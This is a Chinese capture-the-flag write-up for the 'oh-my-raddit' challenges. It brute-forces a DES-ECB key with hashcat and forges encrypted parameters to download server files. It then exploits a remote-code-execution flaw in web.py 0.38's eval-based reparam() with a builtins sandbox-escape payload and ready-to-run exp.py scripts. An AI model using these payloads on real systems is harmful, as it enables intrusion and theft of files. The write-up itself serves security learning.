# oh-my-raddit1

查看源代码发现:
```js
    <script type="text/javascript">
        function change(t){
            var limit = t.value
            if (limit == 10) {
                location.href = '?s=06e77f2958b65ffd3ca92540eb2d0a42';
            } else if (limit == 100) {
                location.href = '?s=06e77f2958b65ffd2c0f7629b9e19627';
            } else {
                location.href = '/';
            }
        }

    </script>
```
推测s是由某种加密方式得来，而`06e77f2958b65ffd3ca92540eb2d0a42`与`06e77f2958b65ffd2c0f7629b9e19627`相比较，前半部分完全一致，推测加密分组为8字节。
AES等加密方法也可以使用8字节分组，但通常是16字节，而DES加密只能使用8字节分组,猜测为DES加密
注意到后缀为`3ca92540eb2d0a42`的实例一共有18处，可以肯定加密的明文是8的倍数，所以末尾统一填充'\x08'*8，而且加密模式为ECB模式，padding规则有`pkcs5padding、pkcs7padding、zeropadding等`但DES通常使用`pkcs5padding`不用`zeropadding`.

所以现在可知`\x08\x08\x08\x08\x08\x08\x08\x08`的加密结果为`'3ca92540eb2d0a42'.decode('hex')`,而且秘钥全是小写字母。
使用hachcat进行爆破:
```
hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 '?l?l?l?l?l?l?l?l' --force
```
得到结果:
```
3ca92540eb2d0a42:0808080808080808:ldgonaro
```
但秘钥并不是`ldgonaro`,是因为DES存在等价秘钥: DES通过种子秘钥生成子秘钥时，将64位的种子秘钥的8，16，24，32，40，48，56，64位作为奇偶校验位，不参与子秘钥的生成算法。
所以秘钥
```
bbbbbbbb
```
等价于
```
cccccccc
```
因为
```py
bin(ord('b'))=0b1100010
bin(ord('c'))=0b1100011
```

使用等价秘钥`ldgonaro`解密所有密文:
```py
from Crypto.Cipher import DES
def get_cipher():
    import requests
    import re
    pattern=re.compile('<a href="\?s=(\w*)">')
    url='http://127.0.0.1:8000/?s=06e77f2958b65ffd2c0f7629b9e19627'
    r=requests.get(url)
    data=r.text
    Cipher=pattern.findall(data)
    return Cipher
key='ldgonaro'
DES_fun=DES.new(key,DES.MODE_ECB)
Cipher=get_cipher()
plainData=[]
for cipher in Cipher:
    plaintext=DES_fun.decrypt(cipher.decode('hex'))
    plainData.append(plaintext)

for plain in plainData:
    print plain
```
在结果中发现一条与众不同的明文:
```
m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec
```
找到其对应的密文，点近其所对应的链接发现是下载功能。
那么构造payload:
```
m=d&f=app.py
```
加密后访问链接得到app.py内容.
exp.py:
```py
from Crypto.Cipher import DES
import requests
def get_cipher(plain):
    key='ldgonaro'
    DES_fun=DES.new(key,DES.MODE_ECB)
    length=DES.block_size-len(plain)%DES.block_size
    plain+=chr(length)*length
    cipher=DES_fun.encrypt(plain).encode('hex')
    return cipher

url='http://127.0.0.1:8000/?s='+get_cipher('m=d&f=app.py')

r=requests.get(url)
print r.text
```
得到app.py:
```py
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'


urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}

def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''
        
        records.append( tmp )
    return records

def get_urls():
    urls = []
    for i in [10, 100, 1000]:
        data = {
            'm': 'p', 
            'l': i
        }
        urls.append( encrypt(urllib.urlencode(data)) )
    return urls

class index:
    def GET(self):
        s = web.input().get('s')
        if not s:
            return web.template.frender('templates/index.html')(get_posts(), get_urls())
        else:
            s = decrypt(s)
            method = s.get('m', '')
            if method and method not in list('rdp'):
                return 'param error'
            if method == 'r':
                uid = s.get('u')
                record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                if record:
                    raise web.seeother(record.url)
                else:
                    return 'not found'
            elif method == 'd':
                file = s.get('f')
                if not os.path.exists(file):
                    return 'not found'
                name = os.path.basename(file)
                web.header('Content-Disposition', 'attachment; filename=%s' % name)
                web.header('Content-Type', 'application/pdf')
                with open(file, 'rb') as fp:
                    data = fp.read()
                return data
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())


if __name__ == "__main__":
    app.run()
```
得到真正的秘钥:megnnaro

# oh-my-raddit2
相同操作下载requirements.txt发现`web.py==0.38`.
这个版本的web.py存在一个RCE: https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/

这个版本的web.py应该是作者提出漏洞后第一次的修复结果:
```py
import web
web.reparam("$__import__('os').getcwd()", {})
Traceback (most recent call last):
  File "<input>", line 1, in <module>
  File "/Users/n3k0/PycharmProjects/webpy/venv/lib/python2.7/site-packages/web/db.py", line 305, in reparam
    v = eval(chunk, dictionary)
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
```
`__import__`无法使用,但下面的payload可用:
```py
import web
web.reparam("${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls'))()} ", {})
test.py
venv
<sql: '0 '>
```
观察到
```
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())
```
使用了`get_posts()`函数。
get_posts:
```py
def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''
        
        records.append( tmp )
    return records
```
在函数get_posts()函数中使用了db.select(),追溯到底层有reparam()函数:
```py
def reparam(string_, dictionary): 
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.

        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    # disable builtins to avoid risk for remote code exection.
    dictionary['__builtins__'] = object()
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else: 
            result.append(chunk)
    return SQLQuery.join(result, '')
```
其中的v = eval(chunk, dictionary)便是利用点。
debug一下，生成payload:
```py
from Crypto.Cipher import DES
import requests
def get_cipher(plain):
    key='ldgonaro'
    DES_fun=DES.new(key,DES.MODE_ECB)
    length=DES.block_size-len(plain)%DES.block_size
    plain+=chr(length)*length
    cipher=DES_fun.encrypt(plain).encode('hex')
    return cipher

url='http://127.0.0.1:8000/?s='+get_cipher("m=p&l=${test}")
print url

http://127.0.0.1:8000/?s=3a3712cba592b47c5ca50b1fa63d1e82
```

在reparam()处下断点，debug:
![屏幕快照 2018-10-30 下午2.42.21](http://p0sa0ryfm.bkt.clouddn.com/2018-10-30-屏幕快照 2018-10-30 下午2.42.21.png)
可以看到传给eval()的参数,但eval()可以执行传入的命令，但并不会回显，可以选择将命令执行的结果放入tmp目录下，再下载下来。

exp.py:
```py
from Crypto.Cipher import DES
import requests
def get_cipher(plain):
    key='ldgonaro'
    DES_fun=DES.new(key,DES.MODE_ECB)
    length=DES.block_size-len(plain)%DES.block_size
    plain+=chr(length)*length
    cipher=DES_fun.encrypt(plain).encode('hex')
    return cipher

url1='http://127.0.0.1:8000/?s='+get_cipher("m=p&l=${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls / > /tmp/data'))()}")
url2='http://127.0.0.1:8000/?s='+get_cipher("m=d&f=/tmp/data")


r1=requests.get(url1)
r2=requests.get(url2)
print r2.text
```
